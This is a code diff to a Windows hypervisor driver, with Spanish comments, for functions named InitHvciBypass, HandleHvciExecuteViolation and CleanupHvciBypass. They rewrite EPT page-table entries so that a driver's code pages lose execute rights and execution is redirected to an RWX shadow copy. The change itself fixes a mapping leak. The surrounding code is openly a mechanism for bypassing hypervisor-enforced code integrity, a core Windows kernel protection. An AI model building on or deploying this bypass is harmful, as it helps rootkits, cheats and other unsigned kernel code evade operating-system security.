@@ -14,13 +14,15 @@ BOOLEAN HandleHvciExecuteViolation(UINT64 GuestPhysAddr, UINT64 GuestRip) {
         ULONG offset = (ULONG)(GuestPhysAddr - base);
         UINT64 shadowPhys = MmGetPhysicalAddress((PUCHAR)g_ShadowText + offset).QuadPart & ~0xFFFULL;
         PUINT64 pte = NULL;
+        PVOID ptMapping = NULL;
         int retries = 0;
         while (!pte && retries < 10) {
-            pte = EptSplitTo4Kb(g_Vmx.EptPml4Phys, GuestPhysAddr);
+            pte = EptSplitTo4Kb(g_Vmx.EptPml4Phys, GuestPhysAddr, &ptMapping);
             retries++;
         }
         if (!pte) return FALSE;
         *pte = (shadowPhys & ~0xFFFULL) | 7; // presente, RWX
+        if (ptMapping) MmUnmapIoSpace(ptMapping, 4096);
         UINT64 desc[2] = { g_Vmx.EptPml4Phys, 0 };
         InvEpt(1, desc);
         // Schedule MTF to restore after instruction
@@ -47,14 +49,16 @@ NTSTATUS InitHvciBypass() {
     for (ULONG offset = 0; offset < g_DriverTextSize; offset += PAGE_SIZE) {
         UINT64 physAddr = g_TextPhysBase + offset;
         PUINT64 pte = NULL;
+        PVOID ptMapping = NULL;
         int retries = 0;
         while (!pte && retries < 10) {
-            pte = EptSplitTo4Kb(g_Vmx.EptPml4Phys, physAddr);
+            pte = EptSplitTo4Kb(g_Vmx.EptPml4Phys, physAddr, &ptMapping);
             retries++;
         }
         if (pte) {
-            *pte &= ~4ULL; // quitar bit de ejecuci?n
+            *pte &= ~4ULL; // quitar bit de ejecución
         }
+        if (ptMapping) MmUnmapIoSpace(ptMapping, 4096);
     }
     UINT64 desc[2] = { g_Vmx.EptPml4Phys, 0 };
     InvEpt(1, desc);
@@ -71,12 +75,14 @@ VOID CleanupHvciBypass() {
         for (ULONG offset = 0; offset < g_DriverTextSize; offset += PAGE_SIZE) {
             UINT64 physAddr = g_TextPhysBase + offset;
             PUINT64 pte = NULL;
+            PVOID ptMapping = NULL;
             int retries = 0;
             while (!pte && retries < 10) {
-                pte = EptSplitTo4Kb(g_Vmx.EptPml4Phys, physAddr);
+                pte = EptSplitTo4Kb(g_Vmx.EptPml4Phys, physAddr, &ptMapping);
                 retries++;
             }
             if (pte) *pte |= 4ULL;
+            if (ptMapping) MmUnmapIoSpace(ptMapping, 4096);
         }
         UINT64 desc[2] = { g_Vmx.EptPml4Phys, 0 };
         InvEpt(1, desc);
